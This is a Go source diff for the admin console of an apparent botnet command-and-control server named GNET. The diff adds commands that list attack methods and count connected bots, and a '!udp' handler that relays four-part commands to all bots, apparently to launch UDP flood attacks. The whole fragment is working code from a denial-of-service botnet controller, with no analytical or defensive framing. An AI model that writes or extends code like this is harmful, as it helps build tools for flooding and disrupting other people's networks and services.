@@ -5,9 +5,11 @@ import (
 	"encoding/json"
 	"fmt"
 	"gnet/art"
+	"gnet/bot"
 	"gnet/cmds"
 	"net"
 	"os"
+	"strconv"
 	"strings"
 
 	"github.com/chzyer/readline"
@@ -127,7 +129,6 @@ func ClientHandler(Connection net.Conn) {
 
 	for {
 
-		Writer.WriteString("\033]0;GNET\a")
 		Writer.Flush()
 		Writer.WriteString("\033[2J\033[H")
 		Writer.Flush()
@@ -154,9 +155,25 @@ func ClientHandler(Connection net.Conn) {
 		Writer.Flush()
 		Command, _ := ReadLine.Readline()
 
+		// Command Handler Section
+
 		if Command == ".help" {
 			Output = cmds.Help()
 		}
 
+		if Command == ".methods" {
+			Output = cmds.Methods()
+		}
+
+		if Command == ".bots" {
+			BOT_COUNT := strconv.Itoa(bot.GetBots())
+			Output = "\r\033[35m[GNET] - " + BOT_COUNT + " bots\033[0m"
+		}
+
+		if len(strings.Split(Command, " ")) == 4 {
+			if strings.Split(Command, " ")[0] == "!udp" {
+				go bot.SendCommandToBots(Command)
+			}
+		}
 	}
 }
